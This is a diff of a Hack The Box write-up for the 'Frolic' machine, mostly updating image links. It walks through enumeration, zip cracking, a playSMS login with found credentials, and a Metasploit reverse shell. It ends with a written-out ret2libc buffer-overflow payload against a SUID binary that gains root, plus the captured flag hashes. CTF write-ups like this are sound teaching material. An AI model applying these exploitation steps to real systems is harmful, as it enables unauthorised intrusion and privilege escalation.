@@ -1,11 +1,13 @@
 # FROLIC
 ## Info
 
-IP Address: 10.10.10.111
-OS: Linux
-Difficulty: Medium
+IP Address: 10.10.10.111  
+OS: Linux  
+Difficulty: Medium  
 
-## NMAP
+## System Enumeration
+
+### NMAP
 ![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/frolicnmap.png "NMAP")
 
 We see two different ports that we can access, `1880` and `9999`
@@ -14,12 +16,12 @@ We see two different ports that we can access, `1880` and `9999`
 ![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/frolicRED.png "RED Service")
 
 ### Port 9999: nginx service
-![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/frolicnginx.png "NGINX")
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicnginx.png "NGINX")
 
 ## Enumerating Port 9999 with Dirbuster
 
 I used the dirb wordlists `big.txt`
-![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/frolicdirbuster.png "Dirbuster")
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicdirbuster.png "Dirbuster")
 
 Looking up all areas with response code 200, which we can access without restrictions
 
@@ -65,8 +67,8 @@ AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAA
 
 This looks like base64 encoding. Using `https://www.freeformatter.com/base64-encoder.html` and downloading the resulting zip, we see that its locked. Using fcrackzip to crack zip passwords, we get
 
-![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/froliczip.png "Locked Zip")
-![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/frolicfcrack.png "FCrackZip")
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/froliczip.png "Locked Zip")
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicfcrack.png "FCrackZip")
 
 Opening up `index.php`, we get
 ```
@@ -95,18 +97,18 @@ A quick google search shows that this is brainfuck, decoding which gets us a str
 This string did not work as password on the `RED` service so I tried enumerating again with a different wordlist, which gave me a new directory
 
 ### /playsms/
-![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/frolicplaysms.png "PlaySMS")
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicplaysms.png "PlaySMS")
 Using the username `admin` and password `idkwhatispass`, we logged in
 
-![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/frolicplaysmslogin.png "LoggedIn Playsms")
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicplaysmslogin.png "LoggedIn Playsms")
 
 Using metasploit, I was able to gain a reverse shell through playsms service
 
-![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/frolicplaysmsexploit.png "Metasploit")
-![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/frolicshell.png "Reverse Shell")
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicplaysmsexploit.png "Metasploit")
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicshell.png "Reverse Shell")
 
 ## User Exposed
-![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/frolicuser.png "User")
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicuser.png "User")
 
 Finally got user
 `user.txt = 2ab95909cf509f85a6f476b59a0c2fe0`
@@ -114,7 +116,8 @@ Finally got user
 ## Privilege Escalation
 
 Following simple steps to check for escalation, I first check for SUID binaries in the system which can be exploited to escalate privileges:
-<image = ropfound>
+
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicsuid.png "SUID rop found")
 
 Finding `rop` means we can exploit it using ret2lib attack and gain root. Downloaded the binary to my local machine(by using the `download <file>` command in meterpreter) to debug it using gdb-peda.
 
@@ -123,7 +126,8 @@ Step 1: Creating a pattern of 100 characters
       `pattern_create 100`
       `AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL`
 Step 2: Finding buffer limit using pattern offset.
-<image = limitfound>
+
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicpatternfound.png "Finding offset")
 
 ### Using libc-search
 
@@ -134,9 +138,13 @@ Step 4: `gcc libc-search.c -o libc-search -lc -ldl`
 Step 5: Search for system, exit using -s 
 Step 6: Search for /bin/sh using -p (set libbase using -b)
 
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/froliclibc.png "Libc Enumeration")
+
 ### Creating Payload
 The addresses are converted to little endian.
-<image = frolicadd>
+
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicadd.png "Address List")
+
 Now, we simply create a python one-line payload to pass as our argument to the `rop` binary.
 ```
 python -c 'print "A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7"+"\x0b\x4a\xf7\xb7"'
@@ -148,4 +156,7 @@ Running
 ./rop $(python -c 'print "A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7"+"\x0b\x4a\xf7\xb7"')
 ```
 We obtain root
-<image = root obtained>
+
+![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicroot.png "Rooted")
+
+`root.txt = 85d3fdf03f969892538ba9a731826222`
